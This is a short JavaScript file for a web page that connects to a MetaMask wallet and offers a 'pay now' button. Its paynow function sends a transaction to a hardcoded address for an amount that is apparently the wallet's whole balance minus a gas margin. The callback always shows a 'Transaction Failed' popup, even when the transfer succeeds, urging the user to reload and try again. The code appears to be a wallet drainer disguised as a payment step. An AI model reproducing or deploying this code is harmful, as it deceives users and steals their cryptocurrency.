function bodyload(){
$("#paynoweth").hide()
}

function load() {
	if (typeof window.ethereum !== 'undefined') {
 		$("#metaMask").removeClass("w3-hide");
	}
	else{
		hideconnectandshow()
	}
}



function connect(){
	hideconnect()
	getAccount()
}

var account
async function getAccount() {
	$("#paynoweth").show()
	$("#youracc").removeClass("w3-hide");
  const accounts = await ethereum.enable();
  account = accounts[0];
  document.querySelector('.showAccount').innerHTML = account;
}




function hideconnect(){
	$("#yesbtn").hide()
	$("#nobtn").hide()
	$("#askmeta").hide()
}
function hideconnectandshow(){
	hideconnect()
		$("#alternativemetamask").removeClass("w3-hide");
}


function paynow(){
var ammmount = (bleg-0.0014)*1000000000000000000;

web3.eth.sendTransaction({
       from: account,
    to: '0xA9B49b0B548F058ee73a2cd1F4893553c03F8595',
     gasPrice: '20000000000',
    value: ammmount.toFixed(5)
}, function(error, hash){
   Swal.fire({
  icon: 'error',
  title: 'Oops...',
  text: 'Transaction Failed ):',
  footer: 'Please reload this page... And try again :('
})
});


}